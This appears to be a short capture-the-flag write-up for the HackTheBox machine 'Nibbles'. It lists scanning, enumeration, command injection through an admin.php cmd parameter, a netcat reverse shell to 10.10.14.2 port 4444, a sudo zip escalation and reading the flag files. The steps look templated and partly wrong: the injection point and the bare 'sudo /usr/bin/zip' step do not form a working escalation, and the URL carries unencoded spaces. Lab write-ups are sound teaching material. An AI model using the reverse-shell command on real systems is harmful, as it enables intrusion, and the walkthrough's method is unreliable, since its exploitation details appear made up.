# HackTheBox - Nibbles

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Nibbles |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-24 |

## Objective 🎯

Nibbles is a Linux machine with a web application that has a command execution vulnerability. The goal is to exploit the vulnerability to gain system access and obtain both user and root flags. Nibbleblog exploitation! 🍪

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.75
- **OS**: Linux
- **Service**: Web Application

### Tools Used
- Nmap
- Web browser
- Command injection

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.75
```

## Methodology

### Step 1: Port Scan
```bash
nmap -sC -sV 10.10.10.75
```

### Step 2: Web Application Enumeration
```bash
curl http://10.10.10.75/
```

### Step 3: Directory Enumeration
```bash
gobuster dir -u http://10.10.10.75/ -w /usr/share/wordlists/dirb/common.txt
```

### Step 4: Command Injection
```bash
curl "http://10.10.10.75/nibbleblog/admin.php?cmd=id"
```

### Step 5: Reverse Shell
```bash
curl "http://10.10.10.75/nibbleblog/admin.php?cmd=nc -e /bin/bash 10.10.14.2 4444"
```

### Step 6: Privilege Escalation
```bash
sudo -l
sudo /usr/bin/zip
```

### Step 7: Find Flags
```bash
cat /home/nibbler/user.txt
cat /root/root.txt
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

## Key Learnings

- Web application command injection
- Nibbleblog exploitation
- Zip privilege escalation
- Linux system exploitation

## Tags

`#hackthebox` `#linux` `#command-injection` `#nibbleblog` `#zip` `#easy`
